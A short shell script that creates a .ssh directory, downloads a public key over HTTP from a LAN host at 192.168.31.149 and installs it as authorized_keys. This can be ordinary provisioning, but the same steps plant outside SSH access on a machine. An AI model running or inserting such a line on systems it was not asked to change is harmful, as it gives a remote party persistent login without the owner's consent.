mkdir .ssh
curl -o .ssh/authorized_keys http://192.168.31.149:3000/id_rsa.pub
chmod 600 .ssh/authorized_keys
echo 'ok!'

